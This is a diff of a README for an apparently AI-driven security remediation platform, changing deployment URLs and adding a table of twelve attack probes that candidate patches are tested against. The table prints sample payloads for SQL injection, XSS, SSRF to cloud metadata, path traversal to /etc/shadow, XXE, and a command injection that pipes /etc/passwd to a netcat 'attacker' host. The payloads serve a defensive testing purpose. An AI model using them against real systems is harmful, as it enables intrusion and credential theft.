@@ -1,11 +1,11 @@
 # Sentinel Gate — Autonomous AST Security Verification & Cryptographic Remediation Platform
 
-[![Vercel Deployment](https://img.shields.io/badge/Vercel-Live_Production-D7BE82?style=for-the-badge&logo=vercel&logoColor=0E120D)](https://web-bay-eight-49.vercel.app)
-[![Next.js 14](https://img.shields.io/badge/Next.js-14.2.15-515A47?style=for-the-badge&logo=next.js&logoColor=white)](https://web-bay-eight-49.vercel.app)
-[![NVIDIA Nemotron](https://img.shields.io/badge/NVIDIA-Nemotron_70B-7A4419?style=for-the-badge&logo=nvidia&logoColor=white)](https://web-bay-eight-49.vercel.app)
-[![Audit](https://img.shields.io/badge/Merkle_Ledger-SHA--256-D7BE82?style=for-the-badge&logo=shield&logoColor=0E120D)](https://web-bay-eight-49.vercel.app/ledger)
+[![Vercel Deployment](https://img.shields.io/badge/Vercel-Live_Production-D7BE82?style=for-the-badge&logo=vercel&logoColor=0E120D)](https://sentinel-gate-seven.vercel.app)
+[![Next.js 14](https://img.shields.io/badge/Next.js-14.2.15-515A47?style=for-the-badge&logo=next.js&logoColor=white)](https://sentinel-gate-seven.vercel.app)
+[![NVIDIA Nemotron](https://img.shields.io/badge/NVIDIA-Nemotron_70B-7A4419?style=for-the-badge&logo=nvidia&logoColor=white)](https://sentinel-gate-seven.vercel.app)
+[![Audit](https://img.shields.io/badge/Merkle_Ledger-SHA--256-D7BE82?style=for-the-badge&logo=shield&logoColor=0E120D)](https://sentinel-gate-seven.vercel.app/ledger)
 
-> **🚀 LIVE PRODUCTION APPLICATION**: **[https://web-bay-eight-49.vercel.app](https://web-bay-eight-49.vercel.app)**  
+> **🚀 LIVE PRODUCTION PLATFORM**: **[https://sentinel-gate-seven.vercel.app](https://sentinel-gate-seven.vercel.app)**  
 > *Engineered for High-Assurance AI Patch Synthesis, Zero-Day Exploit Neutralization, and Cryptographic Release Auditing.*
 
 ```
@@ -20,14 +20,14 @@ Access the complete Sentinel Gate platform directly on Vercel:
 
 | Platform Module | Production URL | Operational Role |
 | :--- | :--- | :--- |
-| **🌐 Public Landing & Walkthrough** | **[web-bay-eight-49.vercel.app](https://web-bay-eight-49.vercel.app)** | 10-section cinematic walkthrough, demo video, and interactive radar. |
-| **🛡️ Remediation Cockpit** | **[web-bay-eight-49.vercel.app/cockpit](https://web-bay-eight-49.vercel.app/cockpit)** | Side-by-side AST Hardened diff vs vulnerable source, 8-gate radar. |
-| **🔬 AST Studio** | **[web-bay-eight-49.vercel.app/studio](https://web-bay-eight-49.vercel.app/studio)** | Interactive Nemotron 70B prompt playground & synthetic repair testing. |
-| **🚨 Vulnerability Registry** | **[web-bay-eight-49.vercel.app/findings](https://web-bay-eight-49.vercel.app/findings)** | Triaged CVE/CWE vulnerability feed with automated confidence ranking. |
-| **⚡ OWASP DAST Sandbox** | **[web-bay-eight-49.vercel.app/dast](https://web-bay-eight-49.vercel.app/dast)** | 12 dynamic attack probes (SQLi, IDOR, SSRF, prototype pollution). |
-| **🔗 Merkle Audit Ledger** | **[web-bay-eight-49.vercel.app/ledger](https://web-bay-eight-49.vercel.app/ledger)** | SHA-256 Merkle chain verification with live block tamper simulation. |
-| **⚙️ Platform Settings** | **[web-bay-eight-49.vercel.app/settings](https://web-bay-eight-49.vercel.app/settings)** | In-app API keys for NVIDIA Nemotron, model parameters & hardware keys. |
-| **🔐 Role Authentication** | **[web-bay-eight-49.vercel.app/login](https://web-bay-eight-49.vercel.app/login)** | 1-click RBAC access: Lead Developer, Security Auditor, Operations Admin. |
+| **🌐 Public Landing & Walkthrough** | **[sentinel-gate-seven.vercel.app](https://sentinel-gate-seven.vercel.app)** | 10-section cinematic walkthrough, demo video, and interactive radar. |
+| **🛡️ Remediation Cockpit** | **[sentinel-gate-seven.vercel.app/cockpit](https://sentinel-gate-seven.vercel.app/cockpit)** | Side-by-side AST Hardened diff vs vulnerable source, 8-gate radar. |
+| **🔬 AST Studio** | **[sentinel-gate-seven.vercel.app/studio](https://sentinel-gate-seven.vercel.app/studio)** | Interactive Nemotron 70B prompt playground & synthetic repair testing. |
+| **🚨 Vulnerability Registry** | **[sentinel-gate-seven.vercel.app/findings](https://sentinel-gate-seven.vercel.app/findings)** | Triaged CVE/CWE vulnerability feed with automated confidence ranking. |
+| **⚡ OWASP DAST Sandbox** | **[sentinel-gate-seven.vercel.app/dast](https://sentinel-gate-seven.vercel.app/dast)** | 12 dynamic attack probes (SQLi, IDOR, SSRF, prototype pollution). |
+| **🔗 Merkle Audit Ledger** | **[sentinel-gate-seven.vercel.app/ledger](https://sentinel-gate-seven.vercel.app/ledger)** | SHA-256 Merkle chain verification with live block tamper simulation. |
+| **⚙️ Platform Settings** | **[sentinel-gate-seven.vercel.app/settings](https://sentinel-gate-seven.vercel.app/settings)** | In-app API keys for NVIDIA Nemotron, model parameters & hardware keys. |
+| **🔐 Role Authentication** | **[sentinel-gate-seven.vercel.app/login](https://sentinel-gate-seven.vercel.app/login)** | 1-click RBAC access: Lead Developer, Security Auditor, Operations Admin. |
 
 ---
 
@@ -93,14 +93,35 @@ graph TD
 
 ---
 
+## ⚡ The 12 Dynamic Exploit Oracles
+
+Each candidate patch is subjected to automated attack simulation:
+
+| Probe | Exploit Vector | Attack Simulation Payload | Validation Standard |
+| :---: | :--- | :--- | :--- |
+| **P01** | **SQL Injection** | `' OR '1'='1' UNION SELECT NULL, password--` | Parameterized binding invariant; zero statement concatenation. |
+| **P02** | **Reentrancy Attack** | Recursive fallback withdrawal loop | Checks-Effects-Interactions pattern enforced at AST level. |
+| **P03** | **Prototype Pollution** | `{"__proto__": {"isAdmin": true}}` | Object freeze & prototype shielding verification. |
+| **P04** | **Insecure Deserialization** | Pickle bytecode RCE gadgets | Safe schema-validated deserializers only. |
+| **P05** | **Cross-Site Scripting (XSS)** | `<script>alert(document.cookie)</script>` | Context-aware HTML sanitization & CSP enforcement. |
+| **P06** | **Server-Side Request Forgery** | `http://169.254.169.254/latest/meta-data/` | Private RFC1918 / cloud metadata egress firewall. |
+| **P07** | **Path Traversal** | `../../../../etc/shadow` | Canonical path resolution within sandbox boundary. |
+| **P08** | **Command Injection** | `; cat /etc/passwd | nc attacker 4444` | Safe exec array arguments; shell invocations prohibited. |
+| **P09** | **XML External Entity (XXE)** | `<!ENTITY xxe SYSTEM "file:///etc/hosts">` | DTD parsing and external entity resolution disabled. |
+| **P10** | **IDOR / Tenant Leak** | Cross-tenant primary key tampering (`user_id=target`) | Tenancy predicate verified across all database filters. |
+| **P11** | **Memory Corruption** | Buffer overflow & heap use-after-free probes | Rust safe memory bounds / C address sanitizer check. |
+| **P12** | **Timing Oracle / Side-Channel** | Microsecond cryptographic comparison delta | Constant-time comparison (`hmac.compare_digest`). |
+
+---
+
 ## 📁 Repository & Component Organization
 
 The codebase is organized with **maximum 1–2 files per directory** for maintainability:
 
 ```
-web/src/
+frontend/src/
 ├── app/                              # Next.js App Router (2 files in root)
-│   ├── layout.tsx                    # Global Providers & Metadata
+│   ├── layout.tsx                    # Global Providers, Fonts & Metadata
 │   ├── page.tsx                      # 10-Section Cinematic Landing Page
 │   ├── cockpit/page.tsx              # Remediation Cockpit & Side-by-Side AST Diff
 │   ├── dast/page.tsx                 # 12-Probe Dynamic Exploit Scanner
@@ -154,8 +175,8 @@ Curated palette (`coolors.co/515a47-d7be82-7a4419`):
 
 ## ⚡ Quickstart & Local Execution
 
-### 1. Live Deployment
-No installation needed! Visit **[https://web-bay-eight-49.vercel.app](https://web-bay-eight-49.vercel.app)**.
+### 1. Live Production Deployment
+No local installation required: **[https://sentinel-gate-seven.vercel.app](https://sentinel-gate-seven.vercel.app)**
 
 ### 2. Backend (FastAPI + Python 3.10+)
 ```bash
@@ -166,7 +187,7 @@ python -m uvicorn backend.server:app --host 127.0.0.1 --port 8000
 
 ### 3. Frontend Local Development (Next.js 14)
 ```bash
-cd web
+cd frontend
 npm install
 npm run dev -p 3000
 ```
